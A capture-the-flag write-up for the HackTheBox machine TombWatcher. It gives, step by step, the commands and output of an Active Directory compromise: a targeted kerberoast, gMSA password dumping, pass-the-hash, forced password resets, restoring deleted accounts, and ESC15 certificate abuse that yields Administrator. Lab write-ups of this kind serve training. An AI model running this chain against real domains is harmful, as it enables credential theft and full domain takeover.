# TombWatcher HackTheBox


## Nmap
- ```nmap -p- -Pn --min-rate=5000 -T4 10.10.11.72```
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 18:42 CST

Nmap scan report for 10.10.11.72

Host is up (0.42s latency).

Not shown: 65514 filtered tcp ports (no-response)

PORT      STATE SERVICE

53/tcp    open  domain

80/tcp    open  http

88/tcp    open  kerberos-sec

135/tcp   open  msrpc

139/tcp   open  netbios-ssn

389/tcp   open  ldap

445/tcp   open  microsoft-ds

464/tcp   open  kpasswd5

593/tcp   open  http-rpc-epmap

636/tcp   open  ldapssl

3268/tcp  open  globalcatLDAP

3269/tcp  open  globalcatLDAPssl

5985/tcp  open  wsman

9389/tcp  open  adws

49667/tcp open  unknown

49685/tcp open  unknown

49686/tcp open  unknown

49687/tcp open  unknown

49706/tcp open  unknown

49712/tcp open  unknown

49739/tcp open  unknown

┌──(root㉿7)-[~/htb/Machines/TombWatcher]

└─# nmap -sC -sV 10.10.11.72 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389

Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-09 18:55 CST

Nmap scan report for 10.10.11.72

Host is up (0.53s latency).

 

PORT     STATE SERVICE       VERSION

53/tcp   open  domain        Simple DNS Plus

80/tcp   open  http          Microsoft IIS httpd 10.0

| http-methods:

|_  Potentially risky methods: TRACE

|_http-server-header: Microsoft-IIS/10.0

|_http-title: IIS Windows Server

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-09 14:54:50Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2025-06-09T14:56:19+00:00; +3h59m30s from scanner time.

| ssl-cert: Subject: commonName=DC01.tombwatcher.htb

| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb

| Not valid before: 2024-11-16T00:47:59

|_Not valid after:  2025-11-16T00:47:59

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2025-06-09T14:56:18+00:00; +3h59m30s from scanner time.

| ssl-cert: Subject: commonName=DC01.tombwatcher.htb

| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb

| Not valid before: 2024-11-16T00:47:59

|_Not valid after:  2025-11-16T00:47:59

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2025-06-09T14:56:19+00:00; +3h59m30s from scanner time.

| ssl-cert: Subject: commonName=DC01.tombwatcher.htb

| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb

| Not valid before: 2024-11-16T00:47:59

|_Not valid after:  2025-11-16T00:47:59

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject: commonName=DC01.tombwatcher.htb

| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb

| Not valid before: 2024-11-16T00:47:59

|_Not valid after:  2025-11-16T00:47:59

|_ssl-date: 2025-06-09T14:56:18+00:00; +3h59m31s from scanner time.

5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

|_http-server-header: Microsoft-HTTPAPI/2.0

|_http-title: Not Found

9389/tcp open  mc-nmf        .NET Message Framing

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```


## Add to hosts
- ```echo "10.10.11.72 tombwatcher.htb DC01.tombwatcher.htb" >> /etc/hosts```

## SMB and WinRM
- ```netexec smb 10.10.11.72 -u henry -p 'H3nry_987TGV!'```
    ```
    SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV!
    ```
- ```netexec winrm 10.10.11.72 -u henry -p 'H3nry_987TGV!'```
    ```
    WINRM       10.10.11.72     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)

    WINRM       10.10.11.72     5985   DC01             [-] tombwatcher.htb\henry:H3nry_987TGV!
    ```
- also
```
[+] IP: 10.10.11.72:445 Name: 10.10.11.72               Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

## Direct Analysis with bloodhound
- ```bloodhound-ce-python -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -dc DC01.tombwatcher.htb -c all -ns 10.10.11.72 --zip```

```
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20250825162804_bloodhound.zip
```

- henry has WriteSPN permissions for Alfred
- Use targetedKerberoast.py to perform a kerberoast attack with a forged SPN to get the ST of the fake service, which is encrypted by Alfred's hash
- Note time synchronization, ntpdate tombwatcher.htb

```
[*] Starting kerberoast attacks

[*] Attacking user (ALFRED)

[VERBOSE] SPN added successfully for (Alfred)

[+] Printing hash for (Alfred)

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$cdaa2f15396e22583b31d098030c85e7$985e2993255f1c7897e62aa54d04b1e578021d57347b2d5895f780400c0132fdc9fdf2f70364b8b666581a23a12e7a929ebf61441c2d887dd7cf30b477a7b28721c699be5f718f76f5105215b95ce5c61baa6aacda779ae2a95c8e966e10b74b510ed372d4af0ec187b74656b9254345909314dc29f05ade9c13e99352830c98d1b3e4567c51157df86faf20c5537d4284d714ef4472632d14f167f6b73dfcee1fca786458e9c6e4ebaeea0c599acb9bea0ea9766649884d27d77d5b250afe7b1954f8ad70bc3e8fc8857737d38442f666ebfa39fc9d38dc4535709b11ac7d1db8f36568ef8198aab47a1ccad6f9287c8d341bfe810a4f9539f01789466c8adf2ea08b07dfcc9d658bde76daa7f5c504cc80a00b080c55c0c1852c7d08140ed9b7e2341cfa8a299ddbb8bf4dccd47e7b6930258fe5b0f766103cfd173182e83461df3e05c88e84161b703c0b349f555dad70887030d9aeddd70c04b445652dd1ea561073f5dae105ca9777faccb0d170defb9a6926dfb67745ec2aaac3056bfe0ac18c309d668e78033bc060fa1a18d8e616b29fd8c586a3449668783500cb8878af51b519a13b5fe7546552af5fa413ba6578c4b03e95cdbb500107e9f8ee7c8cbfe6867f8e11bff55e11433a18a6b2dc39a9746b2059051e0e4cd8942d2b634a4c81a8cf93b511a30cae1aebdb0af93c0189f06ab4dda7de4108a6c051a2ec0140d2634c066b51ecee666b09aacac3c676beb907c594f77bc401dba87d47f524a85460505da0490cd57eb18796b2e56655bf0aa32a7021aef0254404cfd7cba08e10e6d117861faee354c91b9b3843a7ac5fc1cf74c65b65e412193424239f52c28a58583231ede8a257c4f7ffd6f50a9a40d3bd3195a99dad85093a032d8a9a37974e5db8f9aa9a69b251eb44703e4091670713a5619dd1a46c681412289e5cfeaf43075629e1c2a32f69bef0f4a66aa48e593556b1c5edcf23992da7c7b05a55075fde55720d416c4bc8d14eccabf8a5ef8b2ffe4a30826c5e60e54bc2fc694e2a8c8cd8fecaff94a793990cf2e789b166d635802d27bb62105e9746746890d11e5aa76f2da1654880875bbea07a5b82557dab255f00d84e944da3b9e2345a4859f90feaafd5e0f764fdd5ae489af29c2aee9fd2bbadc5a6e80acb43bacfc72769b468419222944b755bad06c1d6da1f657527bec10de076686043734311c2414814eaf3a44e393c63a42f5235cfaebeb90fa5251db2c055c3b7c4e79df5590257462d4a0b64812d37998b9294447f8721e97650b5736fcc35a882de198f511923f80794f1ca0be36f9aad059000518f44a49987c320921bf7ad30da4a78fe0bb353e57846915d381c3ca4fa57b3dd0b7d0d559ed32b37c77aa4b2be6ab9c67d9c87c752fe6d272824e1052a9b0291c67c3e41b1b9b656a6e8780b34612e3a1554422cc7a117b3c80104c2dac993b47cf3186a

[VERBOSE] SPN removed successfully for (Alfred)
```
- time to crack this
``` hashcat -m 13100 spn_hash /usr/share/wordlists/rockyou.txt --show```

- also Alfred has AddSelf access to the INFRASTRUCTURE group, and can add Alfred itself to the target INFRASTRUCTURE group.

- I am now able to do this 
```
└─# bloodyAD -u 'alfred' -p 'basketball' -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred

[+] alfred added to INFRASTRUCTURE
```

- INFRASTRUCTURE group has readGSSAPassword permissions for ANSIBLE_DEV users, and just now Alfred has joined the INFRASTRUCTURE group, and Alfred also has readGMSAPassword permissions for ANSIBLE_DEV users

- gMSADumper.py can read the GMSA password and convert it to its equivalent NT hash value

```
┌──(root㉿7)-[/tools/gMSADumper]
└─# python gMSADumper.py -u 'ALFRED' -p 'basketball' -d 'tombwatcher.htb'
sUsers or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::1c37d00093dc2a5f25176bf2d474afdc
ansible_dev$:aes256-cts-hmac-sha1-96:526688ad2b7ead7566b70184c518ef665cc4c0215a1d634ef5f5bcda6543b5b3
ansible_dev$:aes128-cts-hmac-sha1-96:91366223f82cd8d39b0e767f0061fd9a
┌──(root㉿7)-[~/htb/Machines/TombWatcher]
└─# netexec smb 10.10.11.72 -u ansible_dev$ -H 1c37d00093dc2a5f25176bf2d474afdc
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\ansible_dev$:1c37d00093dc2a5f25176bf2d474afdc
```
- Take the ansible_dev$ machine account and find that it has ForceChangePassword permissions for the SAM account, which can be forced to change the SAM password.

- now directly change the password 

```
┌──(root㉿7)-[~/htb/Machines/TombWatcher]
└─# pth-net rpc password "SAM" "www.n0o0b.com" -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"1c37d00093dc2a5f25176bf2d474afdc" -S "10.10.11.72"
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
 
┌──(root㉿7)-[~/htb/Machines/TombWatcher]
└─#  netexec smb 10.10.11.72 -u SAM -p www.n0o0b.com
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\SAM:www.n0o0b.com
```
- and also change ownership of the JOHN account to SAM itself

- View deleted user objects and found three tombstone records, all of which are cert_admin user OU for ADCS

```
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
 
 
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM
 
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM
 
accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM
```

- you can now restore one of them
``` *Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"```

- You can see the account cert_admin in ldap.
- INCLUDE PHOTO

- Update Blot Handel, cert_admin has joined, and JOHN also has full control over the OU OCRCS cert_admin account
- Change the password directly.

```└─# net rpc password "cert_admin" "www.bllry.com" -U "tombwatcher.htb"/"JOHN"%"www.n0o0b.com" -S 10.10.11.72```

- also Certipy did not find the vulnerability

```
┌──(certipy-venv)(root㉿7)-[~/htb/Machines/TombWatcher]
└─# certipy find -u cert_admin -p 'www.n0o0b.com' -dc-ip 10.10.11.72 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250610203142_Certipy.txt'
[*] Wrote text output to '20250610203142_Certipy.txt'
[*] Saving JSON output to '20250610203142_Certipy.json'
[*] Wrote JSON output to '20250610203142_Certipy.json'
┌──(certipy-venv)(root㉿7)-[~/htb/Machines/TombWatcher]
└─# cat 20250610203142_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
```

- Retrieved to recover the last deleted cert_admin account
- ```*Evil-WinRM* PS C:\Users\john\Documents> Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb"```
- Repeat the previous operation and find ESC15
```
┌──(certipy-venv)(root㉿7)-[~/htb/Machines/TombWatcher]
└─# cat 20250610214000_Certipy.txt
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
```

- ESC15 Follow, generate the certificate ldap to change the password
- INCLUDE THE LINK
```
┌──(certipy-venv)(root㉿7)-[~/htb/Machines/TombWatcher]
└─# certipy-ad req -u 'cert_admin' -p 'www.n0o0b.com' -dc-ip '10.10.11.72' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'administrator@tombwatcher.htb' -application-policies 'Client Authentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@tombwatcher.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'
 
┌──(certipy-venv)(root㉿7)-[~/htb/Machines/TombWatcher]
└─# certipy-ad auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72' -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Certificate identities:
[*]     SAN UPN: 'administrator@tombwatcher.htb'
[*] Connecting to 'ldaps://10.10.11.72:636'
[*] Authenticated to '10.10.11.72' as: 'u:TOMBWATCHER\\Administrator'
Type help for list of commands
 
# help
 
 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.
 
# change_password administrator www.n0o0b.com
Got User DN: CN=Administrator,CN=Users,DC=tombwatcher,DC=htb
Attempting to set new password of: www.n0o0b.com
Password changed successfully!
 
# exit
Bye!
```

- Log in to root.
- 93e649882f3c9bbbbdde1fb3fb35b989
- gg